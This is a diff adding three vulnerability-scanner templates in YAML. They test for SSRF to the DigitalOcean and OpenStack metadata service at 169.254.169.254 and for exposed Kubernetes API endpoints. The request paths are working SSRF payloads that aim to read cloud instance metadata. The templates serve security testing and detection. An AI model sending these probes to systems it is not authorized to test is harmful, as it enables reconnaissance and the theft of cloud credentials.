@@ -1,0 +1,76 @@
+id: cloud-do-metadata
+info:
+  name: DigitalOcean Metadata SSRF
+  author: AniipID
+  severity: high
+  description: Detects SSRF accessing DigitalOcean droplet metadata
+  tags: cloud,digitalocean,metadata,ssrf
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=http://169.254.169.254/metadata/v1.json"
+      - "{{BaseURL}}?url=http://169.254.169.254/metadata/v1/id"
+    matchers:
+      - type: word
+        words:
+          - "droplet_id"
+          - "hostname"
+          - "interfaces"
+          - "floating_ip"
+          - "region"
+        condition: or
+        part: body
+
+---
+id: cloud-openstack-metadata
+info:
+  name: OpenStack Metadata SSRF
+  author: AniipID
+  severity: high
+  description: Detects SSRF accessing OpenStack instance metadata
+  tags: cloud,openstack,metadata,ssrf
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=http://169.254.169.254/openstack"
+      - "{{BaseURL}}?url=http://169.254.169.254/openstack/latest/meta_data.json"
+    matchers:
+      - type: word
+        words:
+          - "openstack"
+          - "meta_data"
+          - "random_seed"
+          - "uuid"
+          - "availability_zone"
+        condition: or
+        part: body
+
+---
+id: cloud-kubernetes-metadata
+info:
+  name: Kubernetes Internal Service Discovery
+  author: AniipID
+  severity: high
+  description: Tests for access to Kubernetes internal API server and service discovery
+  tags: cloud,kubernetes,k8s,discovery
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/namespaces"
+      - "{{BaseURL}}/api/v1/pods"
+      - "{{BaseURL}}/api/v1/services"
+    headers:
+      Authorization: Bearer
+    matchers:
+      - type: word
+        words:
+          - "kind"
+          - "apiVersion"
+          - "namespaces"
+          - "items"
+          - "metadata"
+        condition: or
+        part: body
